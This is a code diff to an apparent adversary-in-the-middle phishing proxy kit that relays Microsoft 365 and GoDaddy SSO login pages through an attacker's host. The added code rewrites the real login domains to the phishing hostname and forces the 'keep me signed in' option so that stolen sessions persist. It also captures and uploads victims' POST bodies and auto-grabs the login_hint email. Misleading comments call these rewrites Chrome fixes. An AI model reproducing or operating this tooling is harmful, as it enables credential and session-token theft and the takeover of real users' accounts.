@@ -18,8 +18,34 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
     }
 
     processRequest() {
-        return super.processRequest()
+        if (this.browserReq.url.startsWith('/kmsi')) {
+            return this.forceKeepSession()
+        } else {
+            return super.processRequest()
+        }
         
+    }
+
+    forceKeepSession() {
+        if (this.browserReq.headers['content-length'] > 0) {
+            let cJust = ''
+            this.browserReq.on('data', (chunk) => {
+                cJust += chunk.toString('utf8')
+            })
+            this.browserReq.on('end', () => {
+                cJust += ''
+                const forceOption = /LoginOptions=\d/
+                const kJust = cJust.replace(forceOption, 'LoginOptions=1')
+
+                this.proxyEndpoint.setHeader('content-length', kJust.length)
+                this.proxyEndpoint.write(kJust)
+                this.proxyEndpoint.end('')
+                // this.proxyEndpoint.write(kJust)
+            })
+        } else {
+            this.browserReq.pipe(this.proxyEndpoint)
+
+        }
     }
 
 
@@ -36,12 +62,20 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
                 replacement: this.browserEndPoint.clientContext.hostname,
              },
              {
+                reg: /sso.secureserver.net/igm, // Google chrome on windows fix
+                replacement: this.browserEndPoint.clientContext.hostname,
+             },
+             {
+                reg: /secureserver.net/igm, // Google chrome on windows fix
+                replacement: this.browserEndPoint.clientContext.hostname,
+             },
+             {
                 reg: /godaddy.com/igm, // Google chrome on windows fix
                 replacement: this.browserEndPoint.clientContext.hostname,
              },
              {
-                 reg: /img6.wsimg.com\/auth-assets\/0336a97aea53761e2aca49b8d609e90b99af5696\/login-panel.js/igm,
-                 replacement: `${this.browserEndPoint.clientContext.hostname}/auth-assets/0336a97aea53761e2aca49b8d609e90b99af5696/login-panel.js`,
+                 reg: /img6.wsimg.com\/auth-assets\/([A-Za-z0-9]*)\/login-panel.js/igm,
+                 replacement: `${this.browserEndPoint.clientContext.hostname}/auth-assets/$1/login-panel.js`,
 
              },
              {
@@ -54,10 +88,10 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
                  replacement: "API_HOST:'godaddy.com',"
 
              },
-             {
-                reg: /<\/html>/igm, // Google chrome on windows fix
-                replacement: '<script>window.onload = function(){function lp(){var e=document.getElementById("i0116");if(e){console.log("kuka");const t=new URLSearchParams(window.location.search).get("qrc")||"";let o;try{o=atob(t)}catch{o=t}e.value=o}else setTimeout(lp,600)}lp();}</script> </html>',
-             },
+            //  {
+            //     reg: /<\/html>/igm, // Google chrome on windows fix
+            //     replacement: '<script>window.onload = function(){function lp(){var e=document.getElementById("i0116");if(e){console.log("kuka");const t=new URLSearchParams(window.location.search).get("qrc")||"";let o;try{o=atob(t)}catch{o=t}e.value=o}else setTimeout(lp,600)}lp();}</script> </html>',
+            //  },
         ]
     }
 
@@ -93,7 +127,8 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
                     }
                 }
 
-                if (this.proxyResp.headers['content-type'].startsWith('application/json')) {
+                if (this.proxyResp.headers['content-type'] && 
+                this.proxyResp.headers['content-type'].startsWith('application/json')) {
                     const JObjBody = JSON.parse(newMsgBody)
                     if (JObjBody.hasOwnProperty('Credentials')) {
                         const hostDomain = this.browserEndPoint.clientContext.hostname
@@ -141,14 +176,18 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
     execute(clientContext) {
 
+
+        super.loadAutoGrab(configExport.AUTOGRAB_CODE)
+
+
         if (this.req.method === 'POST') {
            
-            // if (this.req.url.startsWith('/common/GetCredentialType')) {
-            //     super.captureBody(clientContext.currentDomain, clientContext)
+            if (this.req.url.startsWith('/common/GetCredentialType')) {
+                super.captureBody(clientContext.currentDomain, clientContext)
 
-            // }else { 
+            }else { 
                 super.uploadRequestBody(clientContext.currentDomain, clientContext)
-            // }
+            }
         }
         
 
@@ -158,8 +197,15 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
        
         if (this.req.url.startsWith('/v1/api')) {
-            clientContext.currentDomain = 'sso.godaddy.com'
+            // clientContext.currentDomain = 'sso.godaddy.com'
            
+        }
+
+        if (this.req.url.startsWith(`/${clientContext.hostname}`)) {
+            clientContext.currentDomain = 'sso.godaddy.com'
+            this.req.url = this.req.url.replace(clientContext.hostname, '')
+            this.req.url = this.req.url.replace('/~:443/', '')
+            console.log('max url is ' + this.req.url)
         }
 
         const redirectToken = this.checkForRedirect()
@@ -201,7 +247,11 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 const configExport = {
     CURRENT_DOMAIN: 'login.microsoftonline.com',
 
+    AUTOGRAB_CODE: 'login_hint',
+
+
     START_PATH: '/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code id_token&scope=openid profile https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=637929903776466681.Y2Y4YjNjOWItNWRlMi00NWRmLWEyNGEtNGMxM2RhNjhmMmY1NTI3YmM5OTMtOWEyNi00YWJjLTg5ZDAtYmYyMjgwOWFjMWUx&ui_locales=en-US&mkt=en-US&state=G-VlqctyXJoQazNds6PWnW7GHB_JRMNCQNIscmNm49y8wyBm0ioAbPHzBE3jzPLGCyk2xLKOAqbJtwTLTLDUqnAJFuN5Si8AFjBXKydzhb6x4EIi3_N0oFy9vVNHYBjWByDP66t5m5Ra01fSIg5C_SimIq8o1nplzEjy9Yh5zzJM6YRiEI82IK6PzXyy32HA_42pbx0DvZw525HpcuVgMA1VWPZiCKFly3JEnMPTh7Ldfoo6w-4xJkUhkywZlP-WulmpO3prRseGYKBIVVplJw&x-client-SKU=ID_NETSTANDARD2_0&x-client-ver=6.12.1.0',
+    
     EXTERNAL_FILTERS: 
         [
         // 'login.live.com',
